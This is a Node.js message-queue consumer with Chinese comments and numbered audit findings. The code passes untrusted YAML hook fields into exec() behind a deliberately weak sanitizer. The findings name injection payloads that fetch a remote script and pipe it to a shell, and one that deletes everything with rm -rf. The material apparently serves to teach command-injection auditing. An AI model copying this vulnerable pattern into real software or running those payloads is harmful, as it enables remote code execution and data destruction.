```javascript
// config-ingest.js
// 被上层服务调用：消费 'config.submit' 队列消息，解析外部提交的配置清单并应用钩子
const { exec } = require('child_process');
const yaml = require('js-yaml');

const queue = require('./mq-client').channel('configs');

// 弱防御：仅拦截分号与反引号，可被 $(...) 命令替换绕过
function sanitize(value) {
  return String(value).replace(/[;`]/g, '');
}

queue.consume('config.submit', (message) => {
  // message.content 为外部提交的 YAML 配置文件内容（不可信）
  const manifest = yaml.load(message.content.toString());

  if (!manifest || !manifest.hooks) {
    return;
  }

  for (const hook of manifest.hooks) {
    const cmd = `deploy-hook ${sanitize(hook.name)} --target ${hook.target}`;
    // 危险 sink：拼接外部数据后执行 shell 命令
    exec(cmd, { cwd: '/srv/deploy' }, (err, stdout) => {
      if (err) console.error('hook failed:', err.message);
      else console.log(`hook output: ${stdout}`);
    });
  }
});
```

3. 第 24 行：`sanitize` 是黑名单式弱防御，仅删除 `;` 和反引号；攻击者可在 name 中注入 `$(curl evil.sh|sh)` 或 `&& rm -rf /` 等形式绕过（未过滤 `$`、`&`、`|`、换行），且该函数只作用于 `hook.name`，完全不覆盖 `hook.target` 字段。
4. 第 25 行：污点 `hook.name`/`hook.target` 直接拼入模板字符串形成 `cmd`，随后第 27 行 `exec(cmd, ...)` 以 shell 方式执行——source 到 sink 的可达路径完整成立，且因弱过滤可绕过 + target 无任何过滤，构成有效命令注入。
